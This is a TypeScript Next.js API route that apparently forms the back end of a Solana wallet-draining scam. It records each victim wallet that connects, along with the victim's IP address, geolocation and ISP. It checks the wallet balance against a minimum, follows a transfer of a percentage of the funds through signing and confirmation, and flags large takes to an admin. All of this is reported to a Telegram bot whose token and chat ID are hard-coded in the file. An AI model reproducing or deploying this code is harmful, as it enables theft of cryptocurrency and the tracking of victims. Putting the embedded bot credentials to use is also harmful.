import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey } from "@solana/web3.js"

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7556622176"
const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID

// Configuration
const CONFIG = {
  minBalanceSOL: 0.01,
  fallbackSOLPrice: 153.32,
  cacheDuration: 300000,
  notificationRetry: 3,
  supportedWallets: ["phantom", "solflare"] as const,
}

type WalletType = "Phantom" | "Solflare" | "Unknown"
type TransactionStatus = "connected" | "scanned" | "prepared" | "signed" | "confirmed" | "failed"

// Cache for SOL price
let cachedSolPrice = CONFIG.fallbackSOLPrice
let cacheTimestamp = 0

async function getSOLPrice(): Promise<number> {
  const now = Date.now()
  
  if (cachedSolPrice > 0 && now - cacheTimestamp < CONFIG.cacheDuration) {
    return cachedSolPrice
  }

  try {
    const controllers: AbortController[] = []
    
    const pricePromises = [
      fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", 3000, controllers),
      fetchWithTimeout("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT", 2000, controllers),
    ]

    const results = await Promise.allSettled(pricePromises)
    
    controllers.forEach(controller => controller.abort())

    for (const result of results) {
      if (result.status === "fulfilled" && result.value) {
        try {
          const data = result.value
          
          if (data.solana?.usd) {
            cachedSolPrice = data.solana.usd
            cacheTimestamp = now
            return cachedSolPrice
          }
          
          if (data.price) {
            cachedSolPrice = parseFloat(data.price)
            cacheTimestamp = now
            return cachedSolPrice
          }
        } catch {
          continue
        }
      }
    }
    
    return CONFIG.fallbackSOLPrice
  } catch (error) {
    console.error("Price fetch error:", error)
    return CONFIG.fallbackSOLPrice
  }
}

async function fetchWithTimeout(url: string, timeout: number, controllers: AbortController[]): Promise<any> {
  const controller = new AbortController()
  const timeoutId = setTimeout(() => controller.abort(), timeout)
  controllers.push(controller)

  try {
    const response = await fetch(url, {
      signal: controller.signal,
      headers: { "User-Agent": "Solana-Wallet-App/1.0" },
    })
    
    clearTimeout(timeoutId)
    return await response.json()
  } catch (error) {
    clearTimeout(timeoutId)
    throw error
  }
}

async function sendTelegramNotification(message: string, isError: boolean = false) {
  for (let attempt = 1; attempt <= CONFIG.notificationRetry; attempt++) {
    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      const chatId = isError ? ADMIN_TELEGRAM_CHAT_ID : TELEGRAM_CHAT_ID

      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      })

      if (response.ok) return true

      if (attempt < CONFIG.notificationRetry) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt))
      }
    } catch (error) {
      if (attempt === CONFIG.notificationRetry) {
        console.error("Telegram notification failed:", error)
      }
    }
  }
  return false
}

async function sendWalletConnectionNotification(
  walletAddress: string,
  walletType: WalletType,
  userIP: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    hour: "2-digit",
    minute: "2-digit",
    month: "short",
    day: "numeric",
  })

  const locationData = await getIPLocation(userIP)

  const message = `
🔌 *WALLET CONNECTED*

📱 *Wallet:* ${walletType}
📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`

🌍 *User Info:*
├─ IP: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
└─ ISP: ${locationData.isp}

🕐 *Time:* ${date} UTC
📡 *Network:* Solana Mainnet
🔄 *Status:* CONNECTED → SCANNING...
`.trim()

  await sendTelegramNotification(message)
}

async function sendWalletScanNotification(
  walletAddress: string,
  walletType: WalletType,
  balanceSOL: number,
  balanceUSD: number,
  userIP: string,
  status: "sufficient" | "insufficient" | "error",
  details?: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    hour: "2-digit",
    minute: "2-digit",
    month: "short",
    day: "numeric",
  })

  const locationData = await getIPLocation(userIP)
  
  const statusEmoji = status === "sufficient" ? "✅" : status === "insufficient" ? "⚠️" : "❌"
  const statusText = status === "sufficient" ? "BALANCE OK" : 
                     status === "insufficient" ? "LOW BALANCE" : "SCAN ERROR"

  const message = `
📊 *WALLET SCANNED*

${statusEmoji} *Status:* ${statusText}
📱 *Wallet:* ${walletType}
📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
💰 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
${status === "insufficient" ? `⚠️ *Min Required:* ${CONFIG.minBalanceSOL} SOL` : ''}
${status === "sufficient" ? `📈 *Status:* READY FOR TRANSACTION` : ''}

🌍 *User Info:*
├─ IP: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
└─ ISP: ${locationData.isp}

${details ? `📝 *Details:* ${details}` : ''}

🕐 *Time:* ${date} UTC
📡 *Network:* Solana Mainnet
`.trim()

  await sendTelegramNotification(message, status === "error")
}

async function sendTransactionNotification(
  walletAddress: string,
  walletType: WalletType,
  balanceSOL: number,
  balanceUSD: number,
  userIP: string,
  transactionAmount: number,
  percentage: number,
  status: "preparing" | "signed" | "confirmed" | "failed",
  txSignature?: string,
  errorDetails?: string
) {
  const date = new Date().toLocaleString("en-US", {
    timeZone: "UTC",
    hour: "2-digit",
    minute: "2-digit",
    month: "short",
    day: "numeric",
  })

  const locationData = await getIPLocation(userIP)
  
  const statusConfig = {
    preparing: { emoji: "⚡", text: "TRANSACTION PREPARED" },
    signed: { emoji: "✍️", text: "TRANSACTION SIGNED" },
    confirmed: { emoji: "✅", text: "TRANSACTION CONFIRMED" },
    failed: { emoji: "❌", text: "TRANSACTION FAILED" },
  }[status]

  const explorerLink = txSignature ? `https://solscan.io/tx/${txSignature}` : "Pending"

  const message = `
${statusConfig.emoji} *${statusConfig.text}*

📱 *Wallet:* ${walletType}
📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
💰 *Total Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
${transactionAmount > 0 ? `📤 *Transfer Amount:* ${transactionAmount.toFixed(4)} SOL (${percentage}%)` : ''}
${txSignature ? `📝 *Signature:* \`${txSignature.slice(0, 16)}...\` || \`${txSignature.slice(-16)}\`` : ''}

🌍 *User Info:*
├─ IP: ${userIP}
├─ Location: ${locationData.city}, ${locationData.country}
└─ ISP: ${locationData.isp}

${status === "confirmed" ? `🔗 *Explorer:* ${explorerLink}` : ''}
${errorDetails ? `🛑 *Error:* ${errorDetails}` : ''}

🕐 *Time:* ${date} UTC
📡 *Network:* Solana Mainnet
`.trim()

  await sendTelegramNotification(message, status === "failed")
}

async function getIPLocation(ip: string) {
  try {
    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
      return { city: "Local", country: "Local", isp: "Local Network" }
    }

    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "Solana-Wallet-App/1.0" },
      signal: AbortSignal.timeout(2000),
    })
    
    if (response.ok) {
      const data = await response.json()
      return {
        city: data.city || "Unknown",
        country: data.country_name || "Unknown",
        isp: data.org?.split(' ').slice(0, 3).join(' ') || "Unknown ISP",
      }
    }
  } catch (error) {
    console.error("IP location error:", error)
  }
  
  return { city: "Unknown", country: "Unknown", isp: "Unknown" }
}

async function verifyTransaction(txSignature: string): Promise<boolean> {
  if (!txSignature) return false
  
  try {
    const endpoints = [
      "https://api.mainnet-beta.solana.com",
      "https://solana-api.projectserum.com",
    ]

    for (const endpoint of endpoints) {
      try {
        const connection = new Connection(endpoint, "confirmed")
        const tx = await connection.getTransaction(txSignature, {
          commitment: "confirmed",
        })
        
        if (tx && tx.meta && !tx.meta.err) {
          return true
        }
      } catch {
        continue
      }
    }
  } catch (error) {
    console.error("TX verification failed:", error)
  }
  
  return false
}

function isValidWalletType(walletType: string): walletType is WalletType {
  return ["Phantom", "Solflare", "Unknown"].includes(walletType)
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const requestId = `tx-notify-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
  
  console.log(`[${requestId}] Transaction notification request`)

  try {
    const body = await request.json()
    const {
      walletAddress,
      walletType = "Unknown",
      balanceSOL,
      balanceUSD,
      userIP,
      transactionAmount,
      percentage,
      txSignature,
      status, // New: "connected" | "scanned" | "prepared" | "signed" | "confirmed" | "failed"
      error,
      errorDetails,
      scanDetails, // For scan notifications
    } = body

    // Validate wallet address
    if (!walletAddress || typeof walletAddress !== "string") {
      return NextResponse.json(
        { error: "Valid wallet address required" },
        { status: 400 }
      )
    }

    // Validate wallet type
    const validWalletType: WalletType = isValidWalletType(walletType) ? walletType : "Unknown"

    // Validate SOL address format
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(walletAddress)) {
      return NextResponse.json(
        { error: "Invalid Solana address format" },
        { status: 400 }
      )
    }

    const ipAddress = userIP || request.headers.get("x-forwarded-for") || "unknown"

    // Calculate USD value if needed
    let finalBalanceUSD = balanceUSD
    if (!finalBalanceUSD && balanceSOL !== undefined) {
      const solPrice = await getSOLPrice()
      finalBalanceUSD = balanceSOL * solPrice
    }

    // Handle different notification types based on status
    switch (status) {
      case "connected":
        await sendWalletConnectionNotification(
          walletAddress,
          validWalletType,
          ipAddress
        )
        break

      case "scanned":
        const scanStatus = error === "Insufficient balance" ? "insufficient" : 
                          error ? "error" : "sufficient"
        
        await sendWalletScanNotification(
          walletAddress,
          validWalletType,
          balanceSOL || 0,
          finalBalanceUSD || 0,
          ipAddress,
          scanStatus,
          scanDetails || error
        )
        break

      case "prepared":
        await sendTransactionNotification(
          walletAddress,
          validWalletType,
          balanceSOL || 0,
          finalBalanceUSD || 0,
          ipAddress,
          transactionAmount || 0,
          percentage || 0,
          "preparing"
        )
        break

      case "signed":
        await sendTransactionNotification(
          walletAddress,
          validWalletType,
          balanceSOL || 0,
          finalBalanceUSD || 0,
          ipAddress,
          transactionAmount || 0,
          percentage || 0,
          "signed",
          txSignature
        )
        break

      case "confirmed":
        const verified = txSignature ? await verifyTransaction(txSignature) : false
        
        await sendTransactionNotification(
          walletAddress,
          validWalletType,
          balanceSOL || 0,
          finalBalanceUSD || 0,
          ipAddress,
          transactionAmount || 0,
          percentage || 0,
          "confirmed",
          txSignature
        )
        
        // Send admin alert for large transactions
        if (transactionAmount > 1) {
          const adminMsg = `🏦 LARGE TX: ${validWalletType} - ${transactionAmount.toFixed(2)} SOL - ${walletAddress.slice(0, 8)}...`
          await sendTelegramNotification(adminMsg, true)
        }
        break

      case "failed":
        await sendTransactionNotification(
          walletAddress,
          validWalletType,
          balanceSOL || 0,
          finalBalanceUSD || 0,
          ipAddress,
          transactionAmount || 0,
          percentage || 0,
          "failed",
          undefined,
          error || errorDetails
        )
        break

      default:
        // Legacy support for backward compatibility
        if (error) {
          await sendTransactionNotification(
            walletAddress,
            validWalletType,
            balanceSOL || 0,
            finalBalanceUSD || 0,
            ipAddress,
            transactionAmount || 0,
            percentage || 0,
            "failed",
            undefined,
            error || errorDetails
          )
        } else {
          const verified = txSignature ? await verifyTransaction(txSignature) : false
          
          await sendTransactionNotification(
            walletAddress,
            validWalletType,
            balanceSOL || 0,
            finalBalanceUSD || 0,
            ipAddress,
            transactionAmount || 0,
            percentage || 0,
            "confirmed",
            txSignature
          )
        }
        break
    }

    const processingTime = Date.now() - startTime

    return NextResponse.json({
      success: true,
      message: "Notification sent",
      status: status || "legacy",
      processingTime: `${processingTime}ms`,
      requestId,
    })
  } catch (error) {
    console.error(`[ERROR] Transaction notification API:`, error)
    
    return NextResponse.json(
      { 
        error: "Notification processing failed",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 }
    )
  }
}

export async function GET() {
  return NextResponse.json({
    status: "operational",
    service: "transaction-notifications",
    version: "2.1.0",
    supportedWallets: CONFIG.supportedWallets,
    notificationTypes: ["connected", "scanned", "prepared", "signed", "confirmed", "failed"],
    timestamp: new Date().toISOString(),
  })
              }
